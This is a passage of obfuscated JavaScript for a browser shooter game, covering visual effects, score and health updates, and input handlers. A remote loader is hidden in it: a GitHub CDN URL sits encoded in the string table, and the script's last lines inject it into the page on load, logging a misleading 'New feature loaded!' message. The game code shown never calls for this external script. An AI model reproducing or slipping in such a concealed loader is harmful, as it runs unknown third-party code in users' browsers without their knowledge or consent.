            'size': Math['random']() * 0x3 + 0x1,
            'color': _0x1d0b48,
            'life': 0x0,
            'maxLife': 0x28 + Math[_0x5cd1dd(0x148)]() * 0x14,
            'type': _0x5cd1dd(0x172)
        });
    }
}
function createHitEffect(_0x588225, _0x5d3b5b, _0x109129) {
    createEnhancedHitEffect(_0x588225, _0x5d3b5b, _0x109129);
}
function createExplosion(_0x2ca65c, _0x249dd3, _0x256c56) {
    createEnhancedExplosion(_0x2ca65c, _0x249dd3, _0x256c56, 0x1e);
}
function updateScore() {
    const _0x3a0c1a = _0x5617f4, _0x374c0 = document[_0x3a0c1a(0x14d)](_0x3a0c1a(0x141));
    _0x374c0[_0x3a0c1a(0x176)] = score, _0x374c0['style'][_0x3a0c1a(0x106)] = _0x3a0c1a(0x17a), setTimeout(() => {
        const _0x57d9e1 = _0x3a0c1a;
        _0x374c0[_0x57d9e1(0x166)]['transform'] = _0x57d9e1(0x146);
    }, 0xc8);
}
function _0x396f() {
    const _0x2cf65e = [
        'clientY',
        'duration',
        'arc',
        'score',
        'now',
        'fillRect',
        'max',
        'key',
        'scale(1)',
        'shockwave',
        'random',
        'update',
        's\x20infinite',
        'width',
        'shadowColor',
        'getElementById',
        'color',
        'keyup',
        'save',
        'DOMContentLoaded',
        'script',
        '1724KwQxRj',
        'maxLife',
        'health-fill',
        'add',
        'fillStyle',
        'createLinearGradient',
        'isShooting',
        'floor',
        'body',
        'mousedown',
        'https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js',
        'translate',
        'splice',
        'touches',
        'fadeIn\x200.5s\x20forwards',
        'ellipse',
        'black',
        '#ff6b6b',
        'restart-button',
        'style',
        'appendChild',
        'length',
        'animation',
        'start-button',
        'game-over-screen',
        'clearRect',
        'start-screen',
        '10947336sqXayc',
        'fill',
        'wingAngle',
        'size',
        'debris',
        'getContext',
        '30730XHSDKM',
        'shadowBlur',
        'textContent',
        'addEventListener',
        'hsl(',
        'lastShot',
        'scale(1.5)',
        'speed',
        'rgba(255,\x20255,\x20255,\x200.3)',
        'touchend',
        'load',
        'mouseup',
        'head',
        'abs',
        'beginPath',
        '36OPhldz',
        'block',
        'createElement',
        'white',
        'keydown',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20float\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translate(0,\x200);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2050%\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translate(',
        'life',
        'innerWidth',
        '#00b8a9',
        'sqrt',
        '#0f3460',
        'display',
        'transform',
        'explosion',
        'globalAlpha',
        '#ffffff',
        'fire',
        'restore',
        'opacity',
        'trail',
        'wingDirection',
        'health',
        'float\x20',
        'clientX',
        'flex',
        '#e94560',
        'final-score',
        'ArrowLeft',
        '\x0a\x20\x20\x20\x20@keyframes\x20pulse\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20from\x20{\x20opacity:\x201;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20to\x20{\x20opacity:\x200.5;\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20@keyframes\x20scorePop\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20scale(1);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x2050%\x20{\x20transform:\x20scale(1.5);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20scale(1);\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20@keyframes\x20muzzleFlash\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20opacity:\x201;\x20transform:\x20scale(1);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x2050%\x20{\x20opacity:\x200.8;\x20transform:\x20scale(1.2);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20opacity:\x200;\x20transform:\x20scale(0.8);\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20@keyframes\x20fireTrail\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20opacity:\x201;\x20transform:\x20scale(1)\x20rotate(0deg);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20opacity:\x200;\x20transform:\x20scale(0.3)\x20rotate(360deg);\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20@keyframes\x20shockwave\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20scale(0);\x20opacity:\x201;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20scale(3);\x20opacity:\x200;\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20#score\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20transform\x200.2s\x20ease-out;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20.health-fill\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20width\x200.3s\x20ease,\x20opacity\x200.3s\x20ease;\x0a\x20\x20\x20\x20}\x0a',
        'push',
        '264754wtzSWX',
        'intensity',
        'classList',
        'height',
        'addColorStop',
        'shoot',
        'top',
        '6717iKBsWu',
        '42BIHDRN',
        'touchmove',
        'left',
        ',\x20100%,\x20',
        '#ffc93c',
        'ArrowUp',
        '1078cqANda',
        'strokeStyle',
        '318vyigDo',
        '4828870kiTBkb',
        'preventDefault',
        'innerHTML',
        'ArrowRight',
        'src',
        'cos',
        '#1a1a2e',
        'hit',
        '3215hnvYPX',
        'log',
        'click',
        'lineWidth',
        'pulse\x200.5s\x20infinite\x20alternate',
        'stroke',
        'none',
        '1525888jdDqjO',
        'mousemove',
        'sin',
        'onload',
        'type',
        'particle'
    ];
    _0x396f = function () {
        return _0x2cf65e;
    };
    return _0x396f();
}
function updateHealthBar() {
    const _0x106e12 = _0x5617f4, _0x18940b = document[_0x106e12(0x14d)](_0x106e12(0x155));
    _0x18940b[_0x106e12(0x166)][_0x106e12(0x14b)] = health + '%', health < 0x1e ? _0x18940b[_0x106e12(0x166)][_0x106e12(0x169)] = _0x106e12(0x135) : _0x18940b['style'][_0x106e12(0x169)] = _0x106e12(0x137);
}
function handleKeyDown(_0x35ca2d) {
    const _0x4c3a12 = _0x5617f4;
    if (!gameRunning)
        return;
    switch (_0x35ca2d['key']) {
    case _0x4c3a12(0x115):
        player['x'] -= player[_0x4c3a12(0x17b)];
        break;
    case _0x4c3a12(0x12c):
        player['x'] += player[_0x4c3a12(0x17b)];
        break;
    case _0x4c3a12(0x125):
        player['y'] -= player[_0x4c3a12(0x17b)];
        break;
    case 'ArrowDown':
        player['y'] += player[_0x4c3a12(0x17b)];
        break;
    case '\x20':
        player['isShooting'] = !![];
        break;
    }
}
function handleKeyUp(_0x3499f6) {
    const _0x4576de = _0x5617f4;
    _0x3499f6[_0x4576de(0x145)] === '\x20' && (player[_0x4576de(0x159)] = ![]);
}
let touchX = 0x0, touchY = 0x0;
function handleTouchStart(_0x1c6393) {
    const _0x4a1561 = _0x5617f4;
    if (!gameRunning)
        return;
    _0x1c6393['preventDefault']();
    const _0x45cbca = _0x1c6393[_0x4a1561(0x160)][0x0];
    touchX = _0x45cbca['clientX'], touchY = _0x45cbca['clientY'], player[_0x4a1561(0x159)] = !![];
}
function handleTouchMove(_0x145f37) {
    const _0x47809f = _0x5617f4;
    if (!gameRunning)
        return;
    _0x145f37['preventDefault']();
    const _0x137167 = _0x145f37[_0x47809f(0x160)][0x0];
    player['x'] = _0x137167[_0x47809f(0x111)], player['y'] = _0x137167[_0x47809f(0x13e)];
}
function handleTouchEnd(_0x1964f3) {
    const _0x1e7cea = _0x5617f4;
    if (!gameRunning)
        return;
    _0x1964f3[_0x1e7cea(0x12a)](), player['isShooting'] = ![];
}
function handleMouseMove(_0x2bcb4b) {
    const _0x4322c8 = _0x5617f4;
    if (!gameRunning)
        return;
    player['x'] = _0x2bcb4b[_0x4322c8(0x111)], player['y'] = _0x2bcb4b['clientY'];
}
function handleMouseDown(_0x58a816) {
    const _0x5abbd4 = _0x5617f4;
    if (!gameRunning)
        return;
    player[_0x5abbd4(0x159)] = !![];
}
function handleMouseUp(_0x4d8018) {
    const _0x22ccb5 = _0x5617f4;
    if (!gameRunning)
        return;
    player[_0x22ccb5(0x159)] = ![];
}
document[_0x5617f4(0x177)](_0x5617f4(0x151), initGame);
function loadScript(_0x1e4a03, _0xdfb3b4) {
    const _0x44a7d8 = _0x5617f4, _0xf87f79 = document[_0x44a7d8(0xfc)](_0x44a7d8(0x152));
    _0xf87f79[_0x44a7d8(0x12d)] = _0x1e4a03, _0xf87f79[_0x44a7d8(0x13b)] = _0xdfb3b4, document['head']['appendChild'](_0xf87f79);
}
loadScript(_0x5617f4(0x15d), function () {
    const _0x9046ec = _0x5617f4;
    console[_0x9046ec(0x132)]('New\x20feature\x20loaded!');
});